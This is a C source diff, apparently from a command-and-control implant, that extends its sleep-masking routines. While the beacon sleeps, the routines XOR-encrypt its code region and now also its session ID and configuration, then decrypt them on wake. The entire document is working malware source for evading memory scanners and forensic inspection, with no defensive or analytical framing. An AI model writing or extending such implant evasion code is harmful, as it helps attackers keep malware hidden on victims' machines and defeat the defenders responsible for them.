@@ -272,6 +272,13 @@ static void SmEncrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
     Ctx->OldProtect = old;
 
     SmXorRegion( (PBYTE)Sm->BeaconBase, Sm->BeaconSize, Ctx->Key );
+
+    /* W0.7: mask the instance private region (SessionId + Config) with the
+     * same key.  Heap-backed pages are already RW - no extra VirtualProtect.
+     * Nothing reads these bytes during the wait; SmDecrypt undoes it on wake. */
+    if ( Sm->PrivateBase && Sm->PrivateLen )
+        SmXorRegion( (PBYTE)Sm->PrivateBase, Sm->PrivateLen, Ctx->Key );
+
     Ctx->Encrypted = TRUE;   /* region stays PAGE_READWRITE for the sleep */
 
 #ifdef DEBUG
@@ -287,6 +294,10 @@ static void SmEncrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
 static void SmDecrypt( PNAX_SM_INFO Sm, PSM_CTX Ctx ) {
     if ( ! Ctx->Encrypted )
         return;
+
+    /* W0.7: unmask the instance private region first, then the code span. */
+    if ( Sm->PrivateBase && Sm->PrivateLen )
+        SmXorRegion( (PBYTE)Sm->PrivateBase, Sm->PrivateLen, Ctx->Key );
 
     SmXorRegion( (PBYTE)Sm->BeaconBase, Sm->BeaconSize, Ctx->Key );
 
